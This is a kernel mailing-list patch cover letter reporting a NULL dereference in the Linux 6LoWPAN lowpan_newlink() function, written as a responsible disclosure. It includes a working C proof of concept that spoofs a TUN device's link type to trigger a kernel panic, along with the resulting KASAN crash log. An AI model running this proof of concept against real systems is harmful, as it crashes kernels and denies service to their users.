Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 75C4575809
	for <linux-wpan@vger.kernel.org>; Sat, 29 Aug 2026 10:07:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787998062; cv=none; b=VJ5AeHan4Qer5xg9DCufdYkk+YJuL8/fRJzIhtviaEcbtZHhktcumE4CEhE0Q0jSQEhuRGwS3IueJ++fbYig5HreZ9qi5vxwFqhEnDGeoNZmjr/B+cvkBnSwa+5dVrLOqSRUJQv/4oe6UKIM6Wzb9sXAI2ae0pmNlTwIWgp8Pto=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787998062; c=relaxed/simple;
	bh=nSoMKUagGQnZ6D62OekMMwXkBH6wXTMoV+/eomNc/6w=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=REZnqFXBCYUc0yjhwoXbcnzWoxsJ0XhADM+ZZrxWS8G5Y6uYIKiC8gjeehQdLeo0xYzcwE0I8IFhOAc23f8MqVeSqUX5DUUjbXyuDL/BG/JxLbZCyxsmrZCcw6JXHdrPkSuM231pDQNcaWuN4YF+xKAlBS0rIy5RFiWPRgZWufc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=YIX25CyF; arc=none smtp.client-ip=209.85.210.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="YIX25CyF"
Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-85377c8bc96so1645217b3a.3
        for <linux-wpan@vger.kernel.org>; Sat, 29 Aug 2026 03:07:40 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787998060; x=1788602860; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DPZFrg6jegzboxK1/47kNlZlx6excXq9N5xIdVaJ/9M=;
        b=YIX25CyFpNSy0byAMk93Sndvat2KenKh8pKfdrhdlr9GSXmm92DZb/bX9RyiFdEiT3
         uqgvnfKyMDq8oivzrM4/3AuME4e4gJrMTc+hMSBYwILRoNa1aS6hk/7Cv1qxEJTDX24N
         3hdRVxzWTtq/0EK5bMaFfAhnH1c8ohZ+By6FUMD75Ozi1V8VINPxs/KODE5a3TRISxwU
         UL1vaFK9uxusdcTSBsoSH3/eG8ckapGp7JRK028vubjDaKjvqPEd0RiHudIQnU+aTBe0
         nXe05XxmLlo5TbPyhKapqmyZXTT+66s/KJE3FUinAWiIP0AexDT5ei6FISQyA8VulsKS
         M11w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787998060; x=1788602860;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DPZFrg6jegzboxK1/47kNlZlx6excXq9N5xIdVaJ/9M=;
        b=FqjUNG/+f/k1NvgQLIfhig2sIDZKhikEYd9eJeZNVKDY8/7sgvemD2FqRYyvT2a+EA
         DcXUZYj6UTM5+bYwKkRTCJMHNLnzCkXkM9C7AnDJB7+H2YTle8RE4qqNBpVYo6IabM4d
         +ny4Wb2mBVrZxN10+eEAfk3mr8UZdvj/PXUi1zDTfvKsGWd4Vy3cXm95WS/Q+k483ERj
         vK1r+o3EUEfZnlJVjmptbi+1ky/G5ciwx/pcOLE1VVuHNgetCPZhDd+FkJBk4qfP3jT0
         mgd1rIZdppPb+EMC6KiW0CDDYgTGzvwlM+x7JhhMwIUtYYyQHr+l5EAKBGh/Dg71fOq/
         ARsw==
X-Gm-Message-State: AFuF++mv8KinXOgWepGH9Blp5HEJ6CksyQ1PxWUtwD311ZrIXBFBtPnS
	CfeKmsDVQl0mECvscA2XOD98bj1M1iUDFJWU+zSzxl1ER7q4bsIqVFByCx8aOFaC/aFsrc9oWlg
	kPV9KSa8m
X-Gm-Gg: AR+sD10KB7uKqa1VmM45S8TRiptHa8PQFgfCVpZMafQulHs/gLQZDrm25/5E5tVclWX
	0+KJE4TGKA+3iwcz6jhO/kVCzpH4JJvhkqsS75cho1kv8yKi+rLLldyLuMyv6Vb2vU1wkoeNIwm
	+/VvPAvj+JfxEItT/a97jIxmhtusV0rl+Onmnd9NbYf346C/evb0E6jNLjH3eWEDWpNDO3BYqDd
	ydLofEzIfq1i53C2NDVcEZ6actHoNtEx4ywljksL5+p7c+i6NcGdxT5Z9nb7AF9+cH2TWfvz8By
	k6VLapgOVs4g+gFny8qLsf+A/4mVUntEZzAzlQ5AimBjUXig6tqTaEctEs341PQ65UTU/HQJ1iH
	ILf2o3X72UMIqQzdiFYSXFMLdkBfBanVP5Xg+/nh2VlQqRjLnMxUH25+Hr343xap2A91cHpFN+m
	Fdc51hBpeRhxIUD+eYie9wxIlk/KclRlSzMJDw59qomd0tQWKaflXNCNBoU1Lm4M8kcb2Pdn1Ho
	6luxIs=
X-Received: by 2002:a05:6a21:4c81:b0:3d3:ae40:51e3 with SMTP id adf61e73a8af0-3d3ae405705mr8823557637.23.1787998059655;
        Sat, 29 Aug 2026 03:07:39 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3286f784857sm14008514eec.3.2026.08.29.03.07.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 29 Aug 2026 03:07:38 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-wpan@vger.kernel.org
Cc: alex.aring@gmail.com,
	stefan@datenfreihafen.org,
	miquel.raynal@bootlin.com,
	marcel@holtmann.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] ieee802154: 6lowpan: fix NULL dereference in lowpan_newlink
Date: Sat, 29 Aug 2026 18:07:22 +0800
Message-ID: <cover.1787997209.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-wpan@vger.kernel.org
List-Id: <linux-wpan.vger.kernel.org>
List-Subscribe: <mailto:linux-wpan+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wpan+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers.

We found and validated an issue in net/ieee802154/6lowpan/core.c. The bug is
reachable by a CAP_NET_ADMIN process, including one in a user and network
namespace.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

lowpan_newlink() looks up the device named by IFLA_LINK and checks only
that its link-layer type is ARPHRD_IEEE802154 before dereferencing
wdev->ieee802154_ptr->lowpan_dev. TUNSETLINK allows a down TUN device to
change its type to ARPHRD_IEEE802154 without initializing
ieee802154_ptr, leaving the pointer NULL.

A userspace RTM_NEWLINK request can then select the spoofed TUN device as
the lower device for a new lowpan link and reach the NULL dereference.
The fix rejects devices whose type is wrong or whose ieee802154_ptr is not
initialized, while preserving the existing reference cleanup path.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ./poc

The same PoC was also reproduced in a user and network namespace with:

    make
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE

    #include <errno.h>
    #include <fcntl.h>
    #include <linux/if.h>
    #include <linux/if_arp.h>
    #include <linux/if_tun.h>
    #include <linux/netlink.h>
    #include <linux/rtnetlink.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <sys/socket.h>
    #include <unistd.h>

    static void die(const char *what)
    {
    	perror(what);
    	exit(EXIT_FAILURE);
    }

    static size_t nla_put(char *buf, size_t offset, uint16_t type,
    		      const void *payload, uint16_t payload_len)
    {
    	struct nlattr *nla = (struct nlattr *)(buf + offset);
    	size_t len = NLA_HDRLEN + payload_len;
    	size_t padded = NLA_ALIGN(len);

    	nla->nla_type = type;
    	nla->nla_len = len;
    	memcpy(buf + offset + NLA_HDRLEN, payload, payload_len);
    	if (padded > len)
    		memset(buf + offset + len, 0, padded - len);

    	return offset + padded;
    }

    int main(void)
    {
    	static const unsigned int nl_flags =
    		NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
    	static const char lowpan_name[] = "lowpan0";
    	static const char lowpan_kind[] = "lowpan";
    	struct {
    		struct nlmsghdr nlh;
    		struct ifinfomsg ifm;
    		char attrs[256];
    	} req;
    	struct ifreq ifr = { .ifr_flags = IFF_TUN | IFF_NO_PI };
    	char linkinfo[64];
    	size_t linkinfo_len;
    	size_t attr_len = 0;
    	int tun_fd;
    	int nl_fd;
    	int if_fd;
    	int ifindex;
    	ssize_t sent;

    	memcpy(ifr.ifr_name, "tun0", sizeof("tun0"));

    	tun_fd = open("/dev/net/tun", O_RDWR);
    	if (tun_fd < 0)
    		die("open(/dev/net/tun)");

    	if (ioctl(tun_fd, TUNSETIFF, &ifr) < 0)
    		die("ioctl(TUNSETIFF)");

    	if (ioctl(tun_fd, TUNSETLINK, ARPHRD_IEEE802154) < 0)
    		die("ioctl(TUNSETLINK)");

    	if_fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (if_fd < 0)
    		die("socket(AF_INET)");

    	if (ioctl(if_fd, SIOCGIFINDEX, &ifr) < 0)
    		die("ioctl(SIOCGIFINDEX)");
    	ifindex = ifr.ifr_ifindex;
    	close(if_fd);

    	printf("created %s ifindex=%d\n", ifr.ifr_name, ifindex);
    	fflush(stdout);

    	linkinfo_len = 0;
    	linkinfo_len = nla_put(linkinfo, linkinfo_len, IFLA_INFO_KIND,
    			      lowpan_kind, sizeof(lowpan_kind));

    	memset(&req, 0, sizeof(req));
    	req.nlh.nlmsg_type = RTM_NEWLINK;
    	req.nlh.nlmsg_flags = nl_flags;
    	req.nlh.nlmsg_seq = 1;
    	req.ifm.ifi_family = AF_UNSPEC;

    	attr_len = nla_put(req.attrs, attr_len, IFLA_IFNAME,
    			   lowpan_name, sizeof(lowpan_name));
    	attr_len = nla_put(req.attrs, attr_len, IFLA_LINK,
    			   &ifindex, sizeof(ifindex));
    	attr_len = nla_put(req.attrs, attr_len, IFLA_LINKINFO,
    			   linkinfo, linkinfo_len);

    	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.ifm) + attr_len);

    	nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    	if (nl_fd < 0)
    		die("socket(AF_NETLINK)");

    	sent = send(nl_fd, &req, req.nlh.nlmsg_len, 0);
    	if (sent < 0)
    		die("send(RTM_NEWLINK lowpan)");

    	printf("sent RTM_NEWLINK for kind=%s via %s\n", lowpan_kind, ifr.ifr_name);
    	fflush(stdout);

    	/*
    	 * A healthy kernel would ACK or reject the request here. The vulnerable
    	 * kernel crashes in lowpan_newlink() before the reply is received.
    	 */
    	if (recv(nl_fd, req.attrs, sizeof(req.attrs), 0) < 0)
    		die("recv(netlink ack)");

    	return 0;
    }
	
------END poc.c--------

----BEGIN crash log----

[  336.883661][T10638] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  336.884799][T10638] KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
[  336.885367][T10638] CPU: 1 UID: 1028 PID: 10638 Comm: poc Not tainted 6.12.95 #2
[  336.885860][T10638] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  336.887061][T10638] RIP: 0010:lowpan_newlink+0x13b/0x520
[  336.887454][T10638] Code: c1 ea 03 80 3c 02 00 0f 85 b4 03 00 00 4c 8b a3 60 04 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7c 24 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 83 03 00 00 49 83 7c 24 30 00 0f 85 c6 02 00 00
[  336.888761][T10638] RSP: 0018:ffffc90013eaf698 EFLAGS: 00010216
[  336.889207][T10638] RAX: dffffc0000000000 RBX: ffff888111060000 RCX: ffffc90013eaf600
[  336.889728][T10638] RDX: 0000000000000006 RSI: ffffffff8a8c49a0 RDI: 0000000000000030
[  336.890249][T10638] RBP: ffff888060a31000 R08: 0000000000000000 R09: fffffbfff209d259
[  336.890764][T10638] R10: ffffffff904e92cf R11: 0000000000000001 R12: 0000000000000000
[  336.891278][T10638] R13: ffff888111060460 R14: 0000000000000000 R15: ffffffff9050aae0
[  336.891803][T10638] FS:  00007f0568e9e740(0000) GS:ffff888118a80000(0000) knlGS:0000000000000000
[  336.892381][T10638] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  336.892805][T10638] CR2: 000055c1861f42a8 CR3: 00000000211ac000 CR4: 0000000000750ef0
[  336.893315][T10638] PKRU: 55555554
[  336.893550][T10638] Call Trace:
[  336.893772][T10638]  <TASK>
[  336.893970][T10638]  __rtnl_newlink+0xde5/0x14f0
[  336.894317][T10638]  ? __pfx___rtnl_newlink+0x10/0x10
[  336.894667][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.895040][T10638]  rtnl_newlink+0x62/0x90
[  336.895330][T10638]  rtnetlink_rcv_msg+0x2f0/0xaf0
[  336.895656][T10638]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  336.896008][T10638]  ? __pfx___lock_acquire+0x10/0x10
[  336.896356][T10638]  ? find_held_lock+0x2d/0x110
[  336.896678][T10638]  netlink_rcv_skb+0x136/0x370
[  336.896988][T10638]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  336.897351][T10638]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  336.897697][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.898072][T10638]  ? netlink_deliver_tap+0xcb/0xa80
[  336.898413][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.898773][T10638]  ? netlink_deliver_tap+0x14b/0xa80
[  336.899122][T10638]  netlink_unicast+0x479/0x790
[  336.899462][T10638]  ? __pfx_netlink_unicast+0x10/0x10
[  336.899803][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.900178][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.900539][T10638]  ? __check_object_size+0x2eb/0x4f0
[  336.900887][T10638]  ? netlink_autobind.isra.0+0x183/0x260
[  336.901276][T10638]  netlink_sendmsg+0x76e/0xc10
[  336.901589][T10638]  ? __pfx_netlink_sendmsg+0x10/0x10
[  336.901931][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.902314][T10638]  ? apparmor_socket_sendmsg+0x2e/0x200
[  336.902705][T10638]  __sys_sendto+0x349/0x3a0
[  336.903017][T10638]  ? __pfx___sys_sendto+0x10/0x10
[  336.903366][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.903783][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.904163][T10638]  ? __pfx___sys_socket+0x10/0x10
[  336.904511][T10638]  ? __pfx_ksys_write+0x10/0x10
[  336.904837][T10638]  __x64_sys_sendto+0xe0/0x1c0
[  336.905201][T10638]  ? do_syscall_64+0x93/0x270
[  336.905534][T10638]  ? srso_alias_return_thunk+0x5/0xfbef5
[  336.905902][T10638]  ? lockdep_hardirqs_on+0x7b/0x110
[  336.906574][T10638]  do_syscall_64+0xc7/0x270
[  336.906873][T10638]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  336.907258][T10638] RIP: 0033:0x7f0568f30687
[  336.907565][T10638] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  336.908807][T10638] RSP: 002b:00007ffdb8bb92f0 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  336.909340][T10638] RAX: ffffffffffffffda RBX: 00007f0568e9e740 RCX: 00007f0568f30687
[  336.909849][T10638] RDX: 0000000000000044 RSI: 00007ffdb8bb93c0 RDI: 0000000000000004
[  336.910367][T10638] RBP: 00007ffdb8bb9350 R08: 0000000000000000 R09: 0000000000000000
[  336.910877][T10638] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffdb8bb93e0
[  336.911421][T10638] R13: 00007ffdb8bb93c0 R14: 000055c14dd6f0f0 R15: 00007ffdb8bb9380
[  336.911931][T10638]  </TASK>
[  336.912149][T10638] Modules linked in:
[  336.912658][T10638] ---[ end trace 0000000000000000 ]---
[  336.913015][T10638] RIP: 0010:lowpan_newlink+0x13b/0x520
[  336.913400][T10638] Code: c1 ea 03 80 3c 02 00 0f 85 b4 03 00 00 4c 8b a3 60 04 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7c 24 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 83 03 00 00 49 83 7c 24 30 00 0f 85 c6 02 00 00
[  336.914639][T10638] RSP: 0018:ffffc90013eaf698 EFLAGS: 00010216
[  336.915091][T10638] RAX: dffffc0000000000 RBX: ffff888111060000 RCX: ffffc90013eaf600
[  336.915799][T10638] RDX: 0000000000000006 RSI: ffffffff8a8c49a0 RDI: 0000000000000030
[  336.916430][T10638] RBP: ffff888060a31000 R08: 0000000000000000 R09: fffffbfff209d259
[  336.917131][T10638] R10: ffffffff904e92cf R11: 0000000000000001 R12: 0000000000000000
[  336.917720][T10638] R13: ffff888111060460 R14: 0000000000000000 R15: ffffffff9050aae0
[  336.918392][T10638] FS:  00007f0568e9e740(0000) GS:ffff888118a80000(0000) knlGS:0000000000000000
[  336.919106][T10638] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  336.919633][T10638] CR2: 000055c1861f42a8 CR3: 00000000211ac000 CR4: 0000000000750ef0
[  336.920242][T10638] PKRU: 55555554
[  336.920609][T10638] Kernel panic - not syncing: Fatal exception
[  336.921379][T10638] Kernel Offset: disabled
[  336.921677][T10638] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ieee802154: 6lowpan: fix NULL dereference in lowpan_newlink

 net/ieee802154/6lowpan/core.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0
